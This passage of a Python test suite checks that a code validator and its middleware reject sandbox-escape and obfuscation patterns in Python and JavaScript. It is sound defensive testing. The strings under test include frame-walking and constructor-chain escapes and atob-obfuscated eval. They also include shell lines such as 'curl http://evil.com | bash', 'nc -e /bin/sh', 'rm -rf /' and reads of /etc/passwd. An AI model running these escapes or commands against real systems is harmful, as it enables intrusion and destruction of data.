        result = v.validate(code, "python")
        assert result.valid

    def test_list_comprehension(self):
        """List comprehensions pass."""
        v = CodeValidator()
        result = v.validate("[x**2 for x in range(10)]", "python")
        assert result.valid

    def test_class_definition(self):
        """Class definitions pass."""
        v = CodeValidator()
        code = "class Foo:\n    def bar(self):\n        return 42"
        result = v.validate(code, "python")
        assert result.valid


# ---------------------------------------------------------------------------
# Round 2: Metaclass / Class Assignment Bypass (from HackTricks research)
# ---------------------------------------------------------------------------


class TestMetaclassBypass:
    """Metaclass and class-level assignment of dangerous builtins."""

    def test_metaclass_getitem_exec(self):
        """class Meta(type): __getitem__ = exec — sandbox escape."""
        code = "class Meta(type):\n    __getitem__ = exec"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-class-assign-builtin" for f in result.findings)

    def test_exception_iadd_exec(self):
        """class RCE(Exception): __iadd__ = exec — exception handler bypass."""
        code = "class RCE(Exception):\n    __iadd__ = exec"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-class-assign-builtin" for f in result.findings)

    def test_class_call_eval(self):
        """class Evil: __call__ = eval — callable bypass."""
        code = "class Evil:\n    __call__ = eval"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-class-assign-builtin" for f in result.findings)

    def test_class_enter_exec(self):
        """class Evil: __enter__ = exec — context manager bypass."""
        code = "class Evil:\n    __enter__ = exec"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-class-assign-builtin" for f in result.findings)

    def test_class_getattr_exec(self):
        """class Evil: __getattr__ = exec — attribute access bypass."""
        code = "class Evil:\n    __getattr__ = exec"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_class_init_eval(self):
        """class Evil: __init__ = eval — constructor bypass."""
        code = "class Evil:\n    __init__ = eval"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_class_new_compile(self):
        """class Evil: __new__ = compile — metaclass bypass."""
        code = "class Evil:\n    __new__ = compile"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_class_normal_assignment_passes(self):
        """Normal class assignments should not be flagged."""
        code = "class Foo:\n    x = 42\n    name = 'hello'"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert result.valid

    def test_class_method_assignment_safe_passes(self):
        """Assigning safe functions to dunder methods passes."""
        code = "class Foo:\n    __str__ = str\n    __repr__ = repr"
        v = CodeValidator()
        result = v.validate(code, "python")
        # str and repr are not in blocked_builtins → passes
        assert result.valid


# ---------------------------------------------------------------------------
# Round 2: Frame Walking Attacks (tb_frame, f_globals, gi_frame etc.)
# ---------------------------------------------------------------------------


class TestFrameWalkingAttacks:
    """Traceback and generator frame walking for sandbox escape."""

    def test_tb_frame_access(self):
        """e.__traceback__.tb_frame is caught."""
        code = "try:\n    1/0\nexcept Exception as e:\n    f = e.__traceback__.tb_frame"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert any("tb_frame" in rid for rid in rule_ids)

    def test_f_globals_access(self):
        """frame.f_globals is caught."""
        code = "import sys\nf = sys._getframe()\ng = f.f_globals"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("f_globals" in f.rule_id for f in result.findings)

    def test_f_builtins_access(self):
        """frame.f_builtins is caught."""
        code = "import sys\nf = sys._getframe()\nb = f.f_builtins"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("f_builtins" in f.rule_id for f in result.findings)

    def test_f_locals_access(self):
        """frame.f_locals is caught."""
        code = "import sys\nf = sys._getframe()\nl = f.f_locals"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("f_locals" in f.rule_id for f in result.findings)

    def test_f_code_access(self):
        """frame.f_code is caught."""
        code = "import sys\nf = sys._getframe()\nc = f.f_code"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("f_code" in f.rule_id for f in result.findings)

    def test_gi_frame_access(self):
        """generator.gi_frame is caught."""
        code = "def gen():\n    yield 1\ng = gen()\nf = g.gi_frame"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("gi_frame" in f.rule_id for f in result.findings)

    def test_gi_code_access(self):
        """generator.gi_code is caught."""
        code = "def gen():\n    yield 1\ng = gen()\nc = g.gi_code"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("gi_code" in f.rule_id for f in result.findings)

    def test_cr_frame_access(self):
        """coroutine.cr_frame is caught."""
        code = "async def coro():\n    pass\nc = coro()\nf = c.cr_frame"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("cr_frame" in f.rule_id for f in result.findings)

    def test_cr_code_access(self):
        """coroutine.cr_code is caught."""
        code = "async def coro():\n    pass\nc = coro()\ncd = c.cr_code"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("cr_code" in f.rule_id for f in result.findings)

    def test_ag_frame_access(self):
        """async generator.ag_frame is caught."""
        code = "async def agen():\n    yield 1\na = agen()\nf = a.ag_frame"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("ag_frame" in f.rule_id for f in result.findings)

    def test_ag_code_access(self):
        """async generator.ag_code is caught."""
        code = "async def agen():\n    yield 1\na = agen()\nc = a.ag_code"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("ag_code" in f.rule_id for f in result.findings)

    def test_tb_frame_to_f_builtins_chain(self):
        """Full frame walking chain: tb_frame → f_builtins → __import__."""
        code = (
            "try:\n"
            "    1/0\n"
            "except Exception as e:\n"
            "    e.__traceback__.tb_frame.f_builtins['__import__']('os')"
        )
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert any("tb_frame" in rid for rid in rule_ids)
        assert any("f_builtins" in rid for rid in rule_ids)


# ---------------------------------------------------------------------------
# Round 2: Pickle/Reduce Protocol Attacks
# ---------------------------------------------------------------------------


class TestReduceProtocolAttacks:
    """__reduce__ and __reduce_ex__ protocol attacks."""

    def test_reduce_attr_access(self):
        """obj.__reduce__ is caught."""
        code = "x = obj.__reduce__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("__reduce__" in f.rule_id for f in result.findings)

    def test_reduce_ex_attr_access(self):
        """obj.__reduce_ex__ is caught."""
        code = "x = obj.__reduce_ex__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("__reduce_ex__" in f.rule_id for f in result.findings)

    def test_reduce_subscript_access(self):
        """obj['__reduce__'] is caught."""
        code = "x = obj['__reduce__']"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("__reduce__" in f.rule_id for f in result.findings)

    def test_getattr_reduce(self):
        """getattr(obj, '__reduce__') is caught."""
        code = "x = getattr(obj, '__reduce__')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("py-getattr-bypass" in f.rule_id for f in result.findings)


# ---------------------------------------------------------------------------
# Round 2: Descriptor Hook Attacks
# ---------------------------------------------------------------------------


class TestDescriptorHookAttacks:
    """__init_subclass__, __set_name__, __getattribute__ attacks."""

    def test_init_subclass_attr(self):
        """__init_subclass__ attribute access is caught."""
        code = "x = cls.__init_subclass__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("__init_subclass__" in f.rule_id for f in result.findings)

    def test_set_name_attr(self):
        """__set_name__ attribute access is caught."""
        code = "x = desc.__set_name__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("__set_name__" in f.rule_id for f in result.findings)

    def test_getattribute_attr(self):
        """__getattribute__ attribute access is caught."""
        code = "x = obj.__getattribute__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any("__getattribute__" in f.rule_id for f in result.findings)

    def test_init_subclass_subscript(self):
        """obj['__init_subclass__'] subscript is caught."""
        code = "x = cls['__init_subclass__']"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_getattr_init_subclass(self):
        """getattr(cls, '__init_subclass__') is caught."""
        code = "x = getattr(cls, '__init_subclass__')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid


# ---------------------------------------------------------------------------
# Round 2: Zero-Width Character Bypass
# ---------------------------------------------------------------------------


class TestZeroWidthCharBypass:
    """Zero-width characters in string literals to bypass shell regex."""

    def test_zwsp_in_bash_c(self):
        """Zero-width space in 'ba\u200bsh -c' is still caught."""
        code = 'cmd = "ba\u200bsh -c whoami"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-bash-c" for f in result.findings)

    def test_zwnj_in_rm_rf(self):
        """Zero-width non-joiner in 'rm\u200c -rf /' is still caught."""
        code = 'cmd = "rm\u200c -rf /"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-rm-rf-root" for f in result.findings)

    def test_zwj_in_curl_pipe(self):
        """Zero-width joiner in curl command is still caught."""
        code = 'cmd = "cur\u200dl http://evil.com | bash"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-curl-pipe" for f in result.findings)

    def test_soft_hyphen_in_netcat(self):
        """Soft hyphen in 'nc' command is still caught."""
        code = 'cmd = "n\u00adc -e /bin/sh"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-netcat" for f in result.findings)

    def test_bom_in_etc_passwd(self):
        """BOM in '/etc/passwd' is still caught."""
        code = 'path = "/etc/\ufeffpasswd"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-etc-passwd" for f in result.findings)

    def test_multiple_zwc_in_socat(self):
        """Multiple zero-width chars in 'socat' is still caught."""
        code = 'cmd = "s\u200bo\u200cc\u200dat"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-socat" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 2: Missing JS Module Attacks
# ---------------------------------------------------------------------------


class TestJSMissingModules:
    """JavaScript modules not covered in round 1."""

    def test_require_worker_threads(self):
        """require('worker_threads') is caught."""
        code = "const { Worker } = require('worker_threads')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-worker-threads-require" for f in result.findings)

    def test_require_inspector(self):
        """require('inspector') is caught."""
        code = "const inspector = require('inspector')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-inspector-require" for f in result.findings)

    def test_require_v8(self):
        """require('v8') is caught."""
        code = "const v8 = require('v8')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-v8-require" for f in result.findings)

    def test_require_wasi(self):
        """require('wasi') is caught."""
        code = "const { WASI } = require('wasi')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-wasi-require" for f in result.findings)

    def test_import_from_worker_threads(self):
        """ES6 import from 'worker_threads' is caught."""
        code = "import { Worker } from 'worker_threads'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-worker-threads" for f in result.findings)

    def test_import_from_inspector(self):
        """ES6 import from 'inspector' is caught."""
        code = "import { Session } from 'inspector'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-inspector" for f in result.findings)

    def test_import_from_v8(self):
        """ES6 import from 'v8' is caught."""
        code = "import { serialize } from 'v8'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-v8" for f in result.findings)

    def test_import_from_wasi(self):
        """ES6 import from 'wasi' is caught."""
        code = "import { WASI } from 'wasi'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-wasi" for f in result.findings)

    def test_import_meta_access(self):
        """import.meta access is caught."""
        code = "const url = import.meta.url"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert any(f.rule_id == "js-import-meta" for f in result.findings)

    def test_string_fromcharcode(self):
        """String.fromCharCode obfuscation is caught."""
        code = "const cmd = String.fromCharCode(101, 118, 97, 108)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-string-fromcharcode" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 2: Middleware Performance Guards
# ---------------------------------------------------------------------------


class TestMiddlewarePerformanceGuards:
    """Test middleware body size limit, code entries cap, and early termination."""

    @pytest.fixture
    def mw(self):
        return CodeValidatorMiddleware()

    def _ctx(
        self,
        *,
        endpoints: list[str] | None = None,
        mode: str = "block",
        code_fields: list[str] | None = None,
    ) -> RequestContext:
        ctx = RequestContext()
        ctx.tenant_id = "test"
        cv_cfg: dict = {"mode": mode, "protected_endpoints": endpoints or ["/api/execute"]}
        if code_fields is not None:
            cv_cfg["code_fields"] = code_fields
        ctx.customer_config = {
            "enabled_features": {"code_validator": True},
            "settings": {"code_validator": cv_cfg},
        }
        return ctx

    def _req(self, body: bytes, path: str = "/api/execute", method: str = "POST") -> Request:
        scope = {
            "type": "http",
            "method": method,
            "path": path,
            "query_string": b"",
            "headers": [(b"content-type", b"application/json")],
        }
        req = Request(scope)
        req._body = body
        return req

    @pytest.mark.asyncio
    async def test_oversized_body_rejected(self, mw):
        """Body exceeding 1 MB is rejected."""
        # Create a 1.1 MB body
        big_code = "x = 1\n" * 200_000
        body = json.dumps({"code": big_code, "language": "python"}).encode()
        assert len(body) > 1_048_576  # Confirm > 1MB
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_oversized_body_detect_only_passes(self, mw):
        """Oversized body in detect_only mode passes through."""
        big_code = "x = 1\n" * 200_000
        body = json.dumps({"code": big_code, "language": "python"}).encode()
        req = self._req(body)
        ctx = self._ctx(mode="detect_only")
        result = await mw.process_request(req, ctx)
        assert result is None

    @pytest.mark.asyncio
    async def test_too_many_code_entries_rejected(self, mw):
        """More than 10 code entries triggers rejection."""
        # Create 11+ code fields using nested objects
        data: dict = {"language": "python"}
        # Add top-level fields
        fields = []
        for i in range(6):
            fname = f"code{i}"
            data[fname] = "x = 1"
            fields.append(fname)
        # Add nested objects with code fields (6 more → 12 total)
        for i in range(6):
            data[f"nested{i}"] = {"code0": "y = 2"}
        body = json.dumps(data).encode()
        req = self._req(body)
        ctx = self._ctx(code_fields=fields)
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_early_termination_block_mode(self, mw):
        """In block mode, validation stops after first invalid entry."""
        from unittest.mock import patch

        # First field invalid, second field clean
        data = {
            "code": "import os",
            "script": "x = 1",
            "language": "python",
        }
        body = json.dumps(data).encode()
        req = self._req(body)
        ctx = self._ctx(code_fields=["code", "script"])

        # Spy on CodeValidator.validate to count calls
        original_validate = mw._default_validator.validate
        call_count = 0

        def counting_validate(code, lang):
            nonlocal call_count
            call_count += 1
            return original_validate(code, lang)

        with patch.object(mw._default_validator, "validate", side_effect=counting_validate):
            result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400
        # Should have stopped after first invalid → only 1 call
        assert call_count == 1

    @pytest.mark.asyncio
    async def test_detect_only_scans_all_entries(self, mw):
        """In detect_only mode, all entries are scanned (no early termination)."""
        from unittest.mock import patch

        data = {
            "code": "import os",
            "script": "import subprocess",
            "language": "python",
        }
        body = json.dumps(data).encode()
        req = self._req(body)
        ctx = self._ctx(code_fields=["code", "script"], mode="detect_only")

        original_validate = mw._default_validator.validate
        call_count = 0

        def counting_validate(code, lang):
            nonlocal call_count
            call_count += 1
            return original_validate(code, lang)

        with patch.object(mw._default_validator, "validate", side_effect=counting_validate):
            result = await mw.process_request(req, ctx)
        assert result is None  # detect_only passes through
        # Should scan all entries
        assert call_count == 2


# ---------------------------------------------------------------------------
# Round 3: node: Protocol Prefix Bypass
# ---------------------------------------------------------------------------


class TestNodePrefixBypass:
    """require/import with node: protocol prefix bypasses simple string matching."""

    def test_require_node_child_process(self):
        """require('node:child_process') is caught."""
        code = "const cp = require('node:child_process')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-require" for f in result.findings)

    def test_require_node_fs(self):
        """require('node:fs') is caught."""
        code = "const fs = require('node:fs')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-require" for f in result.findings)

    def test_require_node_vm(self):
        """require('node:vm') is caught."""
        code = "const vm = require('node:vm')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-require" for f in result.findings)

    def test_require_node_inspector(self):
        """require('node:inspector') is caught."""
        code = "const inspector = require('node:inspector')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-require" for f in result.findings)

    def test_import_from_node_child_process(self):
        """ES6 import from 'node:child_process' is caught."""
        code = "import { exec } from 'node:child_process'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-import" for f in result.findings)

    def test_import_from_node_fs(self):
        """ES6 import from 'node:fs' is caught."""
        code = "import { readFile } from 'node:fs'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-import" for f in result.findings)

    def test_dynamic_import_node_prefix(self):
        """Dynamic import('node:child_process') is caught."""
        code = "const cp = await import('node:child_process')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-node-prefix-dynamic-import" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3: Constructor Chain Sandbox Escape
# ---------------------------------------------------------------------------


class TestConstructorChainEscape:
    """Prototype chain traversal to Function constructor."""

    def test_array_sort_constructor_chain(self):
        """[].sort.constructor.constructor('return process')() is caught."""
        code = "[].sort.constructor.constructor('return process')()"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-constructor-chain" for f in result.findings)

    def test_string_constructor_chain(self):
        """''.sub.constructor.constructor('return process')() is caught."""
        code = "''.sub.constructor.constructor('return process')()"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-constructor-chain" for f in result.findings)

    def test_regex_constructor_chain(self):
        """/x/.constructor.constructor('return process')() is caught."""
        code = "/x/.constructor.constructor('return process')()"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-constructor-chain" for f in result.findings)

    def test_error_constructor_escape(self):
        """try { null.f() } catch(e) { e.constructor.constructor('return process')() }"""
        code = "try { null.f() } catch(e) { e.constructor.constructor('return process')() }"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-constructor-chain" for f in result.findings)

    def test_proto_constructor_chain(self):
        """({}).__proto__.constructor.constructor('code')() is caught."""
        code = "({}).__proto__.constructor.constructor('return process')()"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        # Caught by both __proto__ and constructor chain
        rule_ids = {f.rule_id for f in result.findings}
        assert "js-proto" in rule_ids
        assert "js-constructor-chain" in rule_ids


# ---------------------------------------------------------------------------
# Round 3: process.mainModule Sandbox Escape
# ---------------------------------------------------------------------------


class TestProcessMainModule:
    """process.mainModule — documented Node.js sandbox escape."""

    def test_process_mainmodule_require(self):
        """process.mainModule.require('child_process') is caught."""
        code = "process.mainModule.require('child_process')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-mainmodule" for f in result.findings)

    def test_process_mainmodule_constructor_load(self):
        """process.mainModule.constructor._load('fs') is caught."""
        code = "process.mainModule.constructor._load('fs')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-mainmodule" for f in result.findings)

    def test_process_optional_mainmodule(self):
        """process?.mainModule is caught."""
        code = "process?.mainModule?.require?.('child_process')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-mainmodule-optional" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3: Indirect Eval Patterns
# ---------------------------------------------------------------------------


class TestIndirectEvalPatterns:
    """Indirect eval bypasses that avoid eval()."""

    def test_comma_operator_eval(self):
        """(0, eval)('code') is caught."""
        code = "(0, eval)('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-indirect-eval" for f in result.findings)

    def test_eval_call(self):
        """eval.call(null, 'code') is caught."""
        code = "eval.call(null, 'alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-eval-indirect-call" for f in result.findings)

    def test_eval_apply(self):
        """eval.apply(null, ['code']) is caught."""
        code = "eval.apply(null, ['alert(1)'])"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-eval-indirect-call" for f in result.findings)

    def test_eval_bind(self):
        """eval.bind(null)('code') is caught."""
        code = "eval.bind(null)('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-eval-indirect-call" for f in result.findings)

    def test_window_eval(self):
        """window.eval('code') is caught."""
        code = "window.eval('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-global-eval" for f in result.findings)

    def test_self_eval(self):
        """self.eval('code') is caught."""
        code = "self.eval('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-global-eval" for f in result.findings)

    def test_frames_eval(self):
        """frames.eval('code') is caught."""
        code = "frames.eval('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-global-eval" for f in result.findings)

    def test_top_eval(self):
        """top.eval('code') is caught."""
        code = "top.eval('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-global-eval" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3: Obfuscation Patterns
# ---------------------------------------------------------------------------


class TestJSObfuscationPatterns:
    """JavaScript obfuscation techniques."""

    def test_atob_eval(self):
        """atob('ZXZhbA==') — base64 to decode eval is caught."""
        code = "window[atob('ZXZhbA==')]('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-atob" for f in result.findings)

    def test_atob_require(self):
        """atob to build 'require' is caught."""
        code = "globalThis[atob('cmVxdWlyZQ==')](atob('Y2hpbGRfcHJvY2Vzcw=='))"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-atob" for f in result.findings)

    def test_eval_tagged_template(self):
        """eval`code` — tagged template literal is caught."""
        code = "eval`alert(1)`"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-eval-tagged-template" for f in result.findings)

    def test_function_tagged_template(self):
        """Function`return process` — tagged template is caught."""
        code = "Function`return process.env`"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-function-tagged-template" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3: Prototype Manipulation
# ---------------------------------------------------------------------------


class TestPrototypeManipulation:
    """Prototype manipulation patterns beyond __proto__."""

    def test_object_defineproperty(self):
        """Object.defineProperty is caught."""
        code = "Object.defineProperty(Object.prototype, 'isAdmin', { value: true })"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-object-defineproperty" for f in result.findings)

    def test_object_setprototypeof(self):
        """Object.setPrototypeOf is caught."""
        code = "Object.setPrototypeOf(target, maliciousProto)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-object-setprototypeof" for f in result.findings)

    def test_reflect_setprototypeof(self):
        """Reflect.setPrototypeOf is caught."""
        code = "Reflect.setPrototypeOf(target, maliciousProto)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-reflect-setprototypeof" for f in result.findings)

    def test_reflect_defineproperty(self):
        """Reflect.defineProperty is caught."""
        code = "Reflect.defineProperty(Object.prototype, 'x', { value: true })"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-reflect-defineproperty" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3: With Statement and Legacy Accessors
# ---------------------------------------------------------------------------


class TestWithAndLegacyAccessors:
    """with statement and legacy accessor patterns."""

    def test_with_statement(self):
        """with(obj) { ... } is caught."""
        code = "with(new Proxy({}, handler)) { eval('code') }"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-with-statement" for f in result.findings)

    def test_lookup_getter(self):
        """__lookupGetter__ is caught."""
        code = "({}).__lookupGetter__('__proto__')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-lookup-getter" for f in result.findings)

    def test_lookup_setter(self):
        """__lookupSetter__ is caught."""
        code = "({}).__lookupSetter__('__proto__')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-lookup-setter" for f in result.findings)

    def test_define_getter(self):
        """__defineGetter__ is caught."""
        code = "obj.__defineGetter__('x', fn)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-define-getter" for f in result.findings)

    def test_define_setter(self):
        """__defineSetter__ is caught."""
        code = "obj.__defineSetter__('x', fn)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-define-setter" for f in result.findings)

    def test_document_write(self):
        """document.write is caught."""
        code = "document.write('<script>alert(1)</script>')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-document-write" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3: Optional Chaining and Dynamic Import
# ---------------------------------------------------------------------------


class TestOptionalChainingAndDynamicImport:
    """Optional chaining and variable dynamic import patterns."""

    def test_process_optional_env(self):
        """process?.env is caught."""
        code = "const secret = process?.env?.API_KEY"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-env-optional" for f in result.findings)

    def test_dynamic_import_variable(self):
        """import(variable) is caught."""
        code = "const mod = 'child' + '_process'; const cp = await import(mod)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-dynamic-import-variable" for f in result.findings)

    def test_dynamic_import_template_literal(self):
        """import(`${expr}`) is caught."""
        code = "await import(`${'child_process'}`)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-dynamic-import-variable" for f in result.findings)


# ---------------------------------------------------------------------------
# Round 3b: Middleware JSON Smuggling Fixes
# ---------------------------------------------------------------------------


class TestMiddlewareJSONSmuggling:
    """Null byte key smuggling and array-of-dicts nesting bypass."""

    @pytest.fixture
    def mw(self):
        return CodeValidatorMiddleware()

    def _ctx(
        self,
        *,
        endpoints: list[str] | None = None,
        mode: str = "block",
        code_fields: list[str] | None = None,
    ) -> RequestContext:
        ctx = RequestContext()
        ctx.tenant_id = "test"
        cv_cfg: dict = {"mode": mode, "protected_endpoints": endpoints or ["/api/execute"]}
        if code_fields is not None:
            cv_cfg["code_fields"] = code_fields
        ctx.customer_config = {
            "enabled_features": {"code_validator": True},
            "settings": {"code_validator": cv_cfg},
        }
        return ctx

    def _req(self, body: bytes, path: str = "/api/execute", method: str = "POST") -> Request:
        scope = {
            "type": "http",
            "method": method,
            "path": path,
            "query_string": b"",
            "headers": [(b"content-type", b"application/json")],
        }
        req = Request(scope)
        req._body = body
        return req

    @pytest.mark.asyncio
    async def test_null_byte_in_key_rejected(self, mw):
        """Null byte in JSON key ('co\\u0000de') is rejected."""
        # Manually craft JSON with null byte in key via unicode escape
        body = b'{"co\\u0000de": "import os", "language": "python"}'
        # json.loads resolves \\u0000 to \x00 in the key
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_null_byte_key_detect_only_passes(self, mw):
        """Null byte in key in detect_only mode passes through."""
        body = b'{"co\\u0000de": "import os", "language": "python"}'
        req = self._req(body)
        ctx = self._ctx(mode="detect_only")
        result = await mw.process_request(req, ctx)
        assert result is None

    @pytest.mark.asyncio
    async def test_array_of_dicts_code_scanned(self, mw):
        """Code inside array of dicts is scanned."""
        body = json.dumps({
            "items": [{"code": "import os"}],
            "language": "python",
        }).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
